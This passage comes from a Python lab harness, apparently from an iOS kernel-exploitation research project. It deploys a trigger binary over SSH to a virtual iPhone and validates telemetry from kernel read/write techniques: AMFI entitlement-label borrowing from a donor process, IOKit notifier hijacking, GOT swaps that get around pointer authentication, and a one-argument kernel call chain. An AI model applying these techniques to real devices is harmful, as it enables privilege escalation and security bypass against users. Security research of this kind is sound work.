            f"expected one live {executable} donor, observed {len(matches)}"
        )
    return matches[0]


# ---------------------------------------------------------------------------
# Per-mode required-field tables. validate_result reads these and so do the
# tests (required_report_keys), so a key the validator requires cannot drift
# away from what the fixtures carry without a test noticing.
# ---------------------------------------------------------------------------

MODE_BORROW = "borrow"
MODE_TARGET_SWAP = "notification-target-swap"
MODE_BLOCK_CANARY = "notification-block-canary"
MODE_SANDBOX_CANARY = "notification-sandbox-canary"
MODE_2ABE_73D8_CANARY = "notification-2abe-73d8-canary"
MODE_CHECK_MULTI = "ifnet-check-multi-pac-canary"
MODE_KCALL1 = "ifnet-kcall1-pac-canary"
MODE_SYSCTL_CENSUS = "sysctl-pac-census"
MODES = (
    MODE_BORROW, MODE_TARGET_SWAP, MODE_BLOCK_CANARY, MODE_SANDBOX_CANARY,
    MODE_2ABE_73D8_CANARY, MODE_CHECK_MULTI, MODE_KCALL1, MODE_SYSCTL_CENSUS,
)
# validate_result keyword that selects each mode (None for the default).
MODE_FLAGS: dict[str, str | None] = {
    MODE_BORROW: None,
    MODE_TARGET_SWAP: "require_notification_target_swap",
    MODE_BLOCK_CANARY: "require_notification_block_canary",
    MODE_SANDBOX_CANARY: "require_notification_sandbox_canary",
    MODE_2ABE_73D8_CANARY: "require_notification_2abe_73d8_canary",
    MODE_CHECK_MULTI: "require_ifnet_check_multi_pac_canary",
    MODE_KCALL1: "require_ifnet_kcall1_pac_canary",
    MODE_SYSCTL_CENSUS: "require_sysctl_pac_census",
}
# argparse attribute that selects each mode (None for the default).
MODE_ARGS: dict[str, str | None] = {
    MODE_BORROW: None,
    MODE_TARGET_SWAP: "notification_target_swap",
    MODE_BLOCK_CANARY: "notification_block_canary",
    MODE_SANDBOX_CANARY: "notification_sandbox_canary",
    MODE_2ABE_73D8_CANARY: "notification_2abe_73d8_canary",
    MODE_CHECK_MULTI: "ifnet_check_multi_pac_canary",
    MODE_KCALL1: "ifnet_kcall1_pac_canary",
    MODE_SYSCTL_CENSUS: "sysctl_pac_census",
}
# Success strings: one source, PRODUCER_CONSTANTS (.m:2900-2911, .m:564).
MODE_RESULTS = {
    MODE_BORROW: RESULT_BORROW,
    MODE_TARGET_SWAP: RESULT_TARGET_SWAP,
    MODE_BLOCK_CANARY: RESULT_BLOCK_CANARY,
    MODE_SANDBOX_CANARY: RESULT_SANDBOX_CANARY,
    MODE_2ABE_73D8_CANARY: RESULT_2ABE_73D8_CANARY,
    MODE_CHECK_MULTI: RESULT_CHECK_MULTI,
    MODE_KCALL1: RESULT_KCALL1,
    MODE_SYSCTL_CENSUS: RESULT_SYSCTL_CENSUS,
}
# Modes whose run attaches a one-shot KDP breakpoint witness (run_live).
KDP_WITNESS_MODES = frozenset(
    {MODE_BLOCK_CANARY, MODE_SANDBOX_CANARY, MODE_2ABE_73D8_CANARY})
COMMON_WHERE = "IOUserEthernet KRW trigger"
MODE_WHERE = {
    MODE_BORROW: COMMON_WHERE,
    MODE_TARGET_SWAP: "notification target-swap",
    MODE_BLOCK_CANARY: "notification block-canary",
    MODE_SANDBOX_CANARY: "notification sandbox-canary",
    MODE_2ABE_73D8_CANARY: "notification 2abe/73d8",
    MODE_CHECK_MULTI: "ifnet check-multi PAC",
    MODE_KCALL1: "ifnet kcall1",
    MODE_SYSCTL_CENSUS: "sysctl PAC census",
}

# Keys every mode must carry before any mode-specific block runs.
HEADER_KEYS = ("schema", "schemaVersion", "providerOperations",
               "observedKernelBase")
COMMON_PINNED: dict[str, Any] = {
    "kernelReadUsed": True,
    "kernelWriteUsed": True,
    "kernelCallUsed": False,
    "borrowInstalled": True,
    "borrowRestored": True,
    "restoreWholeLabelExact": True,
    "selectorInvokedAfterRestore": True,
    "borrowedOpenKR": ZERO_KR,
    "callKR": ZERO_KR,
}
COMMON_KEYS = ("baselineOpenKR", "result", "createdInterfaces")

CENSUS_PINNED: dict[str, Any] = {
    "kernelReadUsed": True,
    "kernelWriteUsed": False,
    "kernelCallUsed": False,
    "sysctlPACCensusRequested": True,
    "sysctlPACReadOnly": True,
    "sysctlPACCandidateCount": CENSUS_CANDIDATE_COUNT,
    "sysctlPACConditionReadResult": 0,
    "result": MODE_RESULTS[MODE_SYSCTL_CENSUS],
}
CENSUS_RECORD_COUNT = CENSUS_CANDIDATE_COUNT
CENSUS_RECORD_PINNED: dict[str, Any] = {
    "readResult": 0,
    "handlerTargetMatches": True,
    "listMalformed": False,
    "listCycle": False,
}

TARGET_SWAP_PINNED: dict[str, Any] = {
    "notificationTargetSwapRequested": True,
    "notificationTargetSwapReady": True,
    "notificationTargetInstalled": True,
    "notificationTargetRestored": True,
    "notificationSetupResult": 0,
    "notificationACallbacks": 0,
}
TARGET_SWAP_COUNTS = ("notificationBCallbacks", "notificationBServices",
                      "notificationBCallbacksOnQueueB")
TARGET_SWAP_BOUND = ("notificationBLastIterator",
                     "notificationBExpectedIterator")

BLOCK_PINNED: dict[str, Any] = {
    "notificationBlockCanaryRequested": True,
    "notificationTargetSwapReady": True,
    "notificationBlockInstalled": True,
    "notificationBlockRestored": True,
    "notificationSetupResult": 0,
    "notificationACallbacks": 0,
}
SANDBOX_PINNED: dict[str, Any] = {
    "notificationSandboxCanaryRequested": True,
    "notificationTargetSwapReady": True,
    "notificationSandboxInstalled": True,
    "notificationSandboxRestored": True,
    "notificationSetupResult": 0,
    "notificationACallbacks": 0,
}
PAC_2ABE_PINNED: dict[str, Any] = {
    "notification2ABE73D8CanaryRequested": True,
    "notificationTargetSwapReady": True,
    "notification2ABE73D8Prepared": True,
    "notification2ABE73D8Installed": True,
    "notificationBlockRestored": True,
    "notification2ABE73D8Restored": True,
    "notificationSetupResult": 0,
    "notificationACallbacks": 0,
}
PAC_2ABE_COUNTS = ("notification2ABECallbackCount",)

CHECK_MULTI_PINNED: dict[str, Any] = {
    "ifnetCheckMultiPACCanaryRequested": True,
    "ifnetPACGOTReady": True,
    "ifnetPACGOTInstalled": True,
    "ifnetPACGOTRestored": True,
    "ifnetPACSetupResult": 0,
    "ifnetPACGOTInstallResult": 0,
    "ifnetPACDiscriminator": CHECK_MULTI_DISCRIMINATOR,
    "ifnetPACReadbackResult": 0,
    "ifnetPACTriggerResult": -1,
    # Name and value pinned from one source so they cannot disagree.
    "ifnetPACTriggerErrno": ENOEXEC_VALUE,
    "ifnetPACTriggerErrnoName": ENOEXEC_NAME,
}
CHECK_MULTI_STRS = ("ifnetPACBSDName",)
CHECK_MULTI_BOUND = ("ifnetPACCallbackTarget", "ifnetPACCanaryTarget")

KCALL1_PINNED: dict[str, Any] = {
    "ifnetKCall1PACCanaryRequested": True,
    "ifnetKCall1SetupResult": 0,
    "ifnetKCall1SignerStagesResult": 0,
    "ifnetKCall1Result": 0,
    "ifnetKCall1ConstructedArity": KCALL1_ARITY,
    "ifnetKCall1ProviderKCallUsed": False,
    "ifnetKCall1CallbackQuiesced": True,
    "ifnetKCall1ChainInstalled": True,
    "ifnetKCall1TriggerResult": -1,
    # Name and value pinned from one source (as check-multi does); the
    # errno <-> marker binding in KCALL1_BOUND still applies on top.
    "ifnetKCall1TriggerErrno": EINPROGRESS_VALUE,
    "ifnetKCall1TriggerErrnoName": EINPROGRESS_NAME,
    "ifnetKCall1CallbackSanitized": True,
    "ifnetKCall1X0Restored": True,
    "ifnetKCall1TargetRestored": True,
    "ifnetKCall1GOTRestored": True,
    "ifnetKCall1FinalReadResult": 0,
    "ifnetKCall1Success": True,
}
KCALL1_STAGES = (KCALL1_STAGE_STOCK, KCALL1_STAGE_LOAD,
                 KCALL1_STAGE_DISPATCHER)
KCALL1_ADDRESS_FIELDS = (
    "ifnetKCall1MarkerAddress", "ifnetPACGOTAddress",
    "ifnetPACGOTOriginalRaw", "ifnetKCall1OriginalX0",
    "ifnetKCall1OriginalTarget", "ifnetKCall1StockSignedCallback",
    "ifnetKCall1FinalCallbackTarget", "ifnetKCall1FinalGOT",
    "ifnetKCall1FinalX0", "ifnetKCall1FinalTarget",
    "ifnetKCall1FinalCallback",
) + tuple(
    f"ifnetKCall1{stage}{suffix}"
    for stage in KCALL1_STAGES for suffix in ("Target", "CallbackTarget")
)
KCALL1_INT_FIELDS = ("ifnetKCall1MarkerValue",) + \
    tuple(f"ifnetKCall1{stage}ReadbackResult" for stage in KCALL1_STAGES)
KCALL1_STAGE_NAMES = {stage: f"ifnetKCall1{stage}BSDName"
                      for stage in KCALL1_STAGES}
# Producer-only marker: emitted on the signer-stage failure path only.
KCALL1_FORBIDDEN = ("ifnetKCall1FailedStageSanitized",)
KCALL1_BOUND = (
    ("ifnetKCall1TriggerErrno", "ifnetKCall1MarkerValue",
     "ifnet kcall1 trigger errno did not match marker value"),
    ("ifnetKCall1MarkerAddress", "ifnetPACGOTAddress",
     "ifnet kcall1 marker address did not match GOT address"),
    ("ifnetKCall1FinalCallbackTarget", "ifnetKCall1StockTarget",
     "ifnet kcall1 final callback/GOT state mismatched"),
    ("ifnetKCall1FinalGOT", "ifnetPACGOTOriginalRaw",
     "ifnet kcall1 final callback/GOT state mismatched"),
    ("ifnetKCall1FinalX0", "ifnetKCall1OriginalX0",
     "ifnet kcall1 final X0 not restored"),
    ("ifnetKCall1FinalTarget", "ifnetKCall1OriginalTarget",
     "ifnet kcall1 final Target not restored"),
    ("ifnetKCall1FinalCallback", "ifnetKCall1StockSignedCallback",
     "ifnet kcall1 final Callback not restored"),
)

# Declared contradiction pairs (key_a, expected_a, key_b, expected_b):
# "when key_a == expected_a and key_b is present, key_b must == expected_b".
# key_b is deliberately not required: the producer emits
# notificationTargetInstallResult only inside the install block
# (.m:2651) and the validator cannot otherwise tell which path ran.
INSTALL_CONTRADICTION = {
    MODE_TARGET_SWAP: [("notificationTargetInstalled", True,
                        "notificationTargetInstallResult", 0)],
    MODE_BLOCK_CANARY: [("notificationBlockInstalled", True,
                         "notificationTargetInstallResult", 0)],
    MODE_SANDBOX_CANARY: [("notificationSandboxInstalled", True,
                           "notificationTargetInstallResult", 0)],
    MODE_2ABE_73D8_CANARY: [("notification2ABE73D8Installed", True,
                             "notificationTargetInstallResult", 0)],
    # SIOCADDMULTI cleanup only runs when the ioctl succeeded (.m:1399),
    # so a -1 trigger leaves the cleanup result at its initial -1
    # (.m:2597, .m:2170).
    MODE_CHECK_MULTI: [("ifnetPACTriggerResult", -1,
                        "ifnetPACCleanupResult", -1)],
    MODE_KCALL1: [("ifnetKCall1TriggerResult", -1,
                   "ifnetKCall1CleanupResult", -1)],
}


def required_report_keys(mode: str) -> frozenset[str]:
    """Every key validate_result dereferences for `mode` (presence-required).

    Derived from the same tables validate_result reads, so tests can assert
    fixtures and the producer carry them. Contradiction-paired keys are not
    included: see contradiction_keys."""
    if mode not in MODES:
        raise ValueError(mode)
    keys: set[str] = set(HEADER_KEYS)
    if mode == MODE_SYSCTL_CENSUS:
        keys |= set(CENSUS_PINNED) | {"sysctlPACRecords"}
        return frozenset(keys)
    keys |= set(COMMON_PINNED) | set(COMMON_KEYS)
    if mode == MODE_TARGET_SWAP:
        keys |= set(TARGET_SWAP_PINNED) | set(TARGET_SWAP_COUNTS) | \
            set(TARGET_SWAP_BOUND)
    elif mode == MODE_BLOCK_CANARY:
        keys |= set(BLOCK_PINNED)
    elif mode == MODE_SANDBOX_CANARY:
        keys |= set(SANDBOX_PINNED)
    elif mode == MODE_2ABE_73D8_CANARY:
        keys |= set(PAC_2ABE_PINNED) | set(PAC_2ABE_COUNTS)
    elif mode == MODE_CHECK_MULTI:
        keys |= set(CHECK_MULTI_PINNED) | set(CHECK_MULTI_STRS) | \
            set(CHECK_MULTI_BOUND)
    elif mode == MODE_KCALL1:
        keys |= set(KCALL1_PINNED) | set(KCALL1_ADDRESS_FIELDS) | \
            set(KCALL1_INT_FIELDS) | set(KCALL1_STAGE_NAMES.values())
        for key_a, key_b, _ in KCALL1_BOUND:
            keys |= {key_a, key_b}
    return frozenset(keys)


def contradiction_keys(mode: str) -> frozenset[str]:
    """Keys read only by the permissive no_contradiction rule for `mode`."""
    if mode not in MODES:
        raise ValueError(mode)
    keys: set[str] = set()
    for key_a, _, key_b, _ in INSTALL_CONTRADICTION.get(mode, []):
        keys |= {key_a, key_b}
    return frozenset(keys)


def _mode_from_flags(flags: dict[str, bool]) -> str:
    selected = [mode for mode, flag in MODE_FLAGS.items()
                if flag is not None and flags[flag]]
    if len(selected) > 1:
        raise LabError("KRW proof modes are mutually exclusive")
    return selected[0] if selected else MODE_BORROW


def validate_result(
    value: Any, *, require_notification_target_swap: bool = False,
    require_notification_block_canary: bool = False,
    require_notification_sandbox_canary: bool = False,
    require_notification_2abe_73d8_canary: bool = False,
    require_ifnet_check_multi_pac_canary: bool = False,
    require_ifnet_kcall1_pac_canary: bool = False,
    require_sysctl_pac_census: bool = False,
) -> dict[str, Any]:
    mode = _mode_from_flags({
        "require_notification_target_swap": require_notification_target_swap,
        "require_notification_block_canary":
            require_notification_block_canary,
        "require_notification_sandbox_canary":
            require_notification_sandbox_canary,
        "require_notification_2abe_73d8_canary":
            require_notification_2abe_73d8_canary,
        "require_ifnet_check_multi_pac_canary":
            require_ifnet_check_multi_pac_canary,
        "require_ifnet_kcall1_pac_canary": require_ifnet_kcall1_pac_canary,
        "require_sysctl_pac_census": require_sysctl_pac_census,
    })
    where = MODE_WHERE[mode]
    if not isinstance(value, dict) or value.get("schema") != \
            REPORT_SCHEMA or value.get("schemaVersion") != \
            REPORT_SCHEMA_VERSION:
        raise LabError("IOUserEthernet KRW trigger returned an unsupported result")
    operations = _present(value, "providerOperations", COMMON_WHERE)
    if not isinstance(operations, list):
        raise LabError(
            f"{COMMON_WHERE} field missing or mistyped: providerOperations")
    if "KernelCall" in operations:
        raise LabError("IOUserEthernet KRW trigger reported a kcall operation")
    # The driver echoes this as kernelBase; validate it here so an absent
    # key is a LabError rather than a KeyError in run_live.
    require_str(value, "observedKernelBase", COMMON_WHERE)
    if mode == MODE_SYSCTL_CENSUS:
        require_pinned(value, CENSUS_PINNED, where)
        records = value.get("sysctlPACRecords")
        if not isinstance(records, list) or \
                len(records) != CENSUS_RECORD_COUNT:
            raise LabError("sysctl PAC census records failed validation")
        for record in records:
            require_pinned(record, CENSUS_RECORD_PINNED, f"{where} record")
        return value
    require_pinned(value, COMMON_PINNED, COMMON_WHERE)
    if require_str(value, "baselineOpenKR", COMMON_WHERE) == ZERO_KR:
        raise LabError("IOUserEthernet baseline was already authorized")
    if value.get("result") != MODE_RESULTS[mode]:
        raise LabError("IOUserEthernet KRW trigger result did not match mode")
    if mode == MODE_TARGET_SWAP:
        require_pinned(value, TARGET_SWAP_PINNED, where)
        for key in TARGET_SWAP_COUNTS:
            require_int(value, key, where, minimum=1)
        bound_equals(value, *TARGET_SWAP_BOUND, where,
                     message="notification target-swap delivery proof failed")
    elif mode == MODE_BLOCK_CANARY:
        require_pinned(value, BLOCK_PINNED, where)
    elif mode == MODE_SANDBOX_CANARY:
        require_pinned(value, SANDBOX_PINNED, where)
    elif mode == MODE_2ABE_73D8_CANARY:
        require_pinned(value, PAC_2ABE_PINNED, where)
        for key in PAC_2ABE_COUNTS:
            require_int(value, key, where, minimum=1)
    elif mode == MODE_CHECK_MULTI:
        require_pinned(value, CHECK_MULTI_PINNED, where)
        for key in CHECK_MULTI_STRS:
            require_str(value, key, where)
        bound_equals(value, *CHECK_MULTI_BOUND, where,
                     message="ifnet signed callback target readback mismatched")
    elif mode == MODE_KCALL1:
        require_pinned(value, KCALL1_PINNED, where)
        for key in KCALL1_ADDRESS_FIELDS:
            require_str(value, key, where)
        for key in KCALL1_INT_FIELDS:
            require_int(value, key, where)
        for stage in KCALL1_STAGES:
            require_int(value, f"ifnetKCall1{stage}ReadbackResult", where,
                        expected=0)
            bound_equals(value, f"ifnetKCall1{stage}CallbackTarget",
                         f"ifnetKCall1{stage}Target", where,
                         message=f"ifnet kcall1 {stage} target mismatched")
        created_items = value.get("createdInterfaces")
        created_names = {
            item.get("bsdName")
            for item in (created_items if isinstance(created_items, list)
                         else [])
            if isinstance(item, dict)}
        distinct_members(value, KCALL1_STAGE_NAMES, where,
                         created=created_names, plural="stage interfaces",
                         singular="interface")
        for key in KCALL1_FORBIDDEN:
            if key in value:
                raise LabError(
                    "ifnet kcall1 success report carries a failed-stage "
                    "marker")
        for key_a, key_b, message in KCALL1_BOUND:
            bound_equals(value, key_a, key_b, where, message=message)
    no_contradiction(value, INSTALL_CONTRADICTION.get(mode, []), where)
    created = value.get("createdInterfaces")
    if not isinstance(created, list) or not any(
            isinstance(item, dict) and item.get("bsdName") for item in created):
        raise LabError("IOUserEthernet KRW trigger created no BSD interface")
    return value


# ---------------------------------------------------------------------------
# Driver conclusions, one per mode. Each states only what the validated
# telemetry supports, in the project's evidence vocabulary (implemented /
# VM-proved / physical). Modes outside KDP_WITNESS_MODES have no kernel-side
# witness and therefore claim nothing above implemented; the three KDP modes
# claim VM-proved for exactly the attached kdpWitness. No mode produced by
# this tool can be physical evidence (CNDLabKernelProvider.h:37-40). The .m
# result strings are not changed by this text; see MODE_RESULTS.
# ---------------------------------------------------------------------------

LEVEL_IMPLEMENTED = (
    "Level: implemented (no kernel-side witness in this mode; VM telemetry "
    "round-trip only; this tool cannot produce physical evidence)."
)
LEVEL_VM_WITNESS = (
    "Level: VM-proved for exactly the attached kdpWitness once this "
    "observation is saved with --output, and nothing wider; this tool "
    "cannot produce physical evidence."
)
MODE_CONCLUSIONS: dict[str, str] = {
    MODE_BORROW: (
        "KRW-only reversible AMFI-label borrowing reached the normal "
        "IOUserEthernet interface-creation path. Telemetry: baselineOpenKR "
        "nonzero, borrowedOpenKR and callKR zero, one BSD interface "
        "created, restore flags set (verify-on-write; no final label "
        "readback field). 'Without provider kcall' rests on the static "
        "providerOperations declaration and a source check, not on a "
        f"frame log. {LEVEL_IMPLEMENTED}"
    ),
    MODE_TARGET_SWAP: (
        "KRW-only reversible target substitution: observer B counters "
        ">= 1, lastIterator equal to the expected iterator, observer A "
        "callbacks zero, restore flag set. Delivery is userspace-observed; "
        "that the stock 61de action ran kernel-side is not witnessed "
        "(notificationAAction is not surfaced to the validator). "
        f"{LEVEL_IMPLEMENTED}"
    ),
    MODE_BLOCK_CANARY: (
        "KRW-only reversible notifier mutation reached the no-op block "
        "invoke: one-shot KDP breakpoint at the live invoke with x0 equal "
        "to the block, x2 equal to the notifier and x1 equal to the one "
        "created object; restore flags set (no post-restore raw readback "
        f"field). {LEVEL_VM_WITNESS}"
    ),
    MODE_SANDBOX_CANARY: (
        "KRW-only reversible notifier mutation reached the Sandbox publish "
        "callback: one-shot KDP breakpoint at the live callback with x0 "
        "equal to the one created IOService, x1 zero, x2 equal to x0, x3 "
        "equal to the notifier, and the donor's raw signed action stripping "
        f"to the live action; restore flags set. {LEVEL_VM_WITNESS}"
    ),
    MODE_2ABE_73D8_CANARY: (
        "KRW-only reversible notifier and registry mutation landed on the "
        "73d8 return target under a one-shot KDP breakpoint (pc equal to "
        "the return target, stripped x2 equal to it, x1 equal to the one "
        "created object). The 2abe adapter crossing is inferred from the "
        "fixup raw values only; the adapter frame is not parsed from the "
        "backtrace in this observation, so the witness covers the landing, "
        f"not the crossing. {LEVEL_VM_WITNESS}"
    ),
    MODE_CHECK_MULTI: (
        "KRW swapped the ether_check_multi GOT donor; the new ifnet's "
        "callback target read back equal to the one chosen BTI-valid stub "
        f"under IA/{CHECK_MULTI_DISCRIMINATOR}, the GOT restore flag is set, "
        f"and SIOCADDMULTI returned -1/{ENOEXEC_NAME}. Execution of the "
        "chosen target is inferred from errno propagation only; no KDP "
        "witness and no final GOT readback field exist in this mode, and "
        "one target was exercised, not an arbitrary one. "
        f"{LEVEL_IMPLEMENTED}"
    ),
    MODE_KCALL1: (
        "KRW used the stock signer across three stages and installed a "
        "one-argument chain with a chosen x0; SIOCADDMULTI returned "
        f"-1/{EINPROGRESS_NAME} equal to the marker word, and the marker, "
        "GOT, x0, target and callback words read back to their originals. "
        "Chosen-pc and x0 round-trip telemetry observed; the control flow "
        "itself is inferred from errno propagation plus the marker living "
        "only at the chosen GOT word. KDP witness absent for this mode. "
        f"{LEVEL_IMPLEMENTED}"
    ),
    MODE_SYSCTL_CENSUS: (
        f"Read-only KRW classified {CENSUS_CANDIDATE_COUNT} conditional "
        "sysctl OIDs by live list membership and handler target match. "
        "'Without kernel writes' is a producer declaration "
        "(kernelWriteUsed, sysctlPACReadOnly), not a frame log, and the "
        "handler PAC-bit fields are emitted but not validated. "
        f"{LEVEL_IMPLEMENTED}"
    ),
}


def conclusion_for(mode: str) -> str:
    if mode not in MODES:
        raise ValueError(mode)
    return MODE_CONCLUSIONS[mode]


def _mode_from_args(args: argparse.Namespace) -> str:
    selected = [mode for mode, attribute in MODE_ARGS.items()
                if attribute is not None and getattr(args, attribute, False)]
    if len(selected) > 1:
        raise LabError("KRW proof modes are mutually exclusive")
    return selected[0] if selected else MODE_BORROW


def donor_entitlement_is_present(ssh: SSH) -> bool:
    output = ssh.command(
        f"/var/jb/usr/bin/ldid -e {shlex.quote(DONOR_EXECUTABLE)} "
        "2>/dev/null"
    )
    return f"<key>{DONOR_ENTITLEMENT}</key>" in output


def run_live(args: argparse.Namespace) -> dict[str, Any]:
    if args.kernel_debug_port is None and args.kernel_address is None:
        raise LabError("supply --kernel-debug-port or --kernel-address")
    if args.kernel_debug_port is not None:
        kernel_address, kernel_uuid = debugger_kernel_address(
            args.kernel_debug_port
        )
    else:
        if not re.fullmatch(r"0x[0-9A-Fa-f]{16}", args.kernel_address):
            raise LabError("kernel address must be 16-digit hexadecimal")
        kernel_address = args.kernel_address.lower()
        kernel_uuid = "not-captured"
    if (args.notification_block_canary or
            args.notification_sandbox_canary or
            args.notification_2abe_73d8_canary) and \
            args.kernel_debug_port is None:
        raise LabError(
            "notification execution canaries require --kernel-debug-port "
            "for one-shot execution evidence"
        )

    trigger = build_binary(
        TRIGGER_SOURCE,
        "cnd_iouserethernet_krw_trigger",
        architecture="arm64e",
        frameworks=("Foundation", "IOKit"),
    )
    digest = hashlib.sha256(trigger.read_bytes()).hexdigest()
    remote = f"/var/tmp/cnd-iouserethernet-krw-{digest[:16]}"
    ssh = SSH(args.host, args.port, args.user, args.known_hosts,
              args.password_env)
    require_vphone(ssh)
    if ssh.file_kind(STANDALONE_KRW_SOCKET_PATH) != "socket":
        raise LabError("standalone VM KRW provider is not running")
    if args.sysctl_pac_census:
        donor_pid = 2  # Parsed by the helper but unused by the early census.
    else:
        if not donor_entitlement_is_present(ssh):
            raise LabError(f"{DONOR_EXECUTABLE} lacks {DONOR_ENTITLEMENT}")
        donor_pid = exact_process_pid(
            ssh.command("/bin/ps -axo pid=,command="), DONOR_EXECUTABLE
        )
    ssh.copy(trigger, remote)
    ssh.command(
        f"/iosbinpack64/usr/sbin/chown root:wheel {shlex.quote(remote)} && "
        f"/iosbinpack64/bin/chmod 0755 {shlex.quote(remote)}"
    )
    command = (
        f"{shlex.quote(remote)} "
        f"{shlex.quote(STANDALONE_KRW_SOCKET_PATH)} "
        f"{shlex.quote(kernel_address)} {donor_pid}"
    )
    if args.hold:
        command += f" --hold {args.hold}"
    if args.notification_target_swap:
        command += " --notification-target-swap"
    if args.notification_block_canary:
        command += " --notification-block-canary"
    if args.notification_sandbox_canary:
        command += " --notification-sandbox-canary"
    if args.notification_2abe_73d8_canary:
        command += " --notification-2abe-73d8-canary"
    if args.ifnet_check_multi_pac_canary:
        command += " --ifnet-check-multi-pac-canary"
    if args.ifnet_kcall1_pac_canary:
        command += " --ifnet-kcall1-pac-canary"
    if args.sysctl_pac_census:
        command += " --sysctl-pac-census"
    witness = None
    if args.notification_block_canary:
        output, witness = run_block_canary_with_kdp(
            ssh, command, port=args.kernel_debug_port,
            debugger_load_address=kernel_address,
        )
    elif args.notification_sandbox_canary:
        output, witness = run_sandbox_canary_with_kdp(
            ssh, command, port=args.kernel_debug_port,
            debugger_load_address=kernel_address,
        )
    elif args.notification_2abe_73d8_canary:
        output, witness = run_2abe_73d8_canary_with_kdp(
            ssh, command, port=args.kernel_debug_port,
            debugger_load_address=kernel_address,
        )
    else:
        output = ssh.command(command)
    mode = _mode_from_args(args)
    try:
        result = validate_result(
            json.loads(output),
            **({MODE_FLAGS[mode]: True} if MODE_FLAGS[mode] else {}),
        )
    except json.JSONDecodeError as error:
        raise LabError("IOUserEthernet KRW trigger did not return JSON") from error
    conclusion = conclusion_for(mode)
    observation = {
        "schema": "com.zeroxjf.cyanide.iouserethernet-krw-observation",
        "schemaVersion": 1,
        "classification": "vm-runtime-observed",
        "kernelUUID": kernel_uuid,
        "debuggerLoadAddress": kernel_address,
        "kernelBase": result["observedKernelBase"],
        "triggerSHA256": digest,
        "result": result,
        "conclusion": conclusion,
    }
    if witness is not None:
        observation["kdpWitness"] = witness
    return observation


def parser() -> argparse.ArgumentParser:
    result = argparse.ArgumentParser(description=__doc__)
    result.add_argument("--host", required=True)
    result.add_argument("--port", type=int, default=22222)
    result.add_argument("--user", default="root")
    result.add_argument("--known-hosts", type=Path,
                        default=DEFAULT_KNOWN_HOSTS)
    result.add_argument("--password-env", default="CND_VPHONE_ROOT_PASSWORD")
    kernel = result.add_mutually_exclusive_group(required=True)
    kernel.add_argument("--kernel-debug-port", type=int)
    kernel.add_argument("--kernel-address")
    result.add_argument("--hold", type=int, default=0, choices=range(0, 301),
                        metavar="SECONDS")
    notification = result.add_mutually_exclusive_group()
    notification.add_argument(
        "--notification-target-swap", action="store_true"
    )
    notification.add_argument(
        "--notification-block-canary", action="store_true"
    )
    notification.add_argument(
        "--notification-sandbox-canary", action="store_true"
    )
    notification.add_argument(
        "--notification-2abe-73d8-canary", action="store_true"
    )
    notification.add_argument(
        "--ifnet-check-multi-pac-canary", action="store_true"
    )
    notification.add_argument(
        "--ifnet-kcall1-pac-canary", action="store_true"
    )
    notification.add_argument(
        "--sysctl-pac-census", action="store_true"
    )
    result.add_argument("--output", type=Path)
    return result


def main() -> int:
    args = parser().parse_args()
    write_json(args.output, run_live(args))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except LabError as error:
        print(f"error: {error}", file=__import__("sys").stderr)
        raise SystemExit(1)
